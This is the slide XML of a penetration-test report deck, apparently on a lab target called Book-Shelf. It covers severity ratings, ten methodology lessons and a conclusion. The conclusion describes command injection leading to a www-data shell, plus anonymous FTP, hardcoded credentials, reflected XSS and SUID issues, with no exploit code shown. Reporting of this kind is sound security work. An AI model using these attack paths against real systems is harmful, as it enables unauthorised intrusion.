              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6181344" y="1417320"/>
            <a:ext cx="2697480" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EAB308"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6181344" y="1417320"/>
            <a:ext cx="2697480" cy="45720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MEDIUM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6345936" y="2011680"/>
            <a:ext cx="2368296" cy="3108960"/>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100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Anonymous FTP / Information Disclosure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Reflected XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8997696" y="1417320"/>
            <a:ext cx="2697480" cy="3794760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2712"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8997696" y="1417320"/>
            <a:ext cx="2697480" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10B981"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8997696" y="1417320"/>
            <a:ext cx="2697480" cy="45720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LOW/MEDIUM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9162288" y="2011680"/>
            <a:ext cx="2368296" cy="3108960"/>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100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>MySQL Network Exposure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5394960"/>
            <a:ext cx="11064240" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="5504688"/>
            <a:ext cx="10515600" cy="256032"/>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SEVERITIES NOT INFLATED</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="5760720"/>
            <a:ext cx="10515600" cy="502920"/>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SSH was open with no confirmed vulnerability — it is not listed here. MySQL exposure did not lead to compromise, so it is Low/Medium rather than Critical. Every rating maps to demonstrated evidence, not assumption.</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23</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12 · REFLECTION</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Lessons Learned &amp; Professional Methodology</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1554480"/>
            <a:ext cx="5394960" cy="4754880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="2000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>1.  Start with the attack surface — know what's exposed before touching anything.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="2000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2.  Enumerate before exploiting — understand the target fully first.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="2000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>3.  Follow clues from one stage to the next — each finding informs the next hypothesis.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="2000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>4.  Validate vulnerabilities manually — never trust a scanner or a guess blindly.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="2000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>5.  Separate discovery from exploitation — finding ≠ proving.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="1554480"/>
            <a:ext cx="5394960" cy="4754880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="2000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>6.  Separate exploitation from impact — a shell's privilege level is not automatically “full compromise.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="2000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>7.  Never claim unverified privilege escalation — say exactly what was and wasn't demonstrated.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="2000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>8.  Preserve evidence throughout the test — every claim needs a screenshot or raw output behind it.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="2000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>9.  Use tools to support reasoning, not replace it — a tool's output is a data point, not a conclusion.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="2000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>10.  Understand every command used — if you can't explain a flag, don't rely on its output.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365760" y="6565392"/>
            <a:ext cx="8229600" cy="256032"/>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Book-Shelf: 1 Penetration Testing Assessment  |  Mohammed Hany Mamdouh</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11430000" y="6565392"/>
            <a:ext cx="548640" cy="256032"/>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24</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="347472"/>
            <a:ext cx="9144000" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" spc="200" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>13 · CONCLUSION</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>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Final Conclusion</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="11064240" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="EF4444"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="1600200"/>
            <a:ext cx="10515600" cy="10515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assessment demonstrated that the target was vulnerable to unauthenticated OS command injection, leading to remote code execution and an interactive shell as www-data.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3017520"/>
            <a:ext cx="5394960" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F97316"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>THE ATTACK WAS COMPOUNDED BY:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3337560"/>
            <a:ext cx="5394960" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="900"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Anonymous FTP exposure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="900"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Hardcoded application credentials</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="900"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Missing authentication on a profile/admin page</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="900"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Reflected XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="900"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Dangerous SUID file permissions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="900"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Network-exposed MySQL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="3017520"/>
            <a:ext cx="5394960" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="22C55E"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>HOWEVER, THIS REPORT DOES NOT CLAIM:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="3337560"/>
            <a:ext cx="5394960" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3478"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="3520440"/>
            <a:ext cx="4937760" cy="178308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300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Root access was NOT achieved</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1400"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
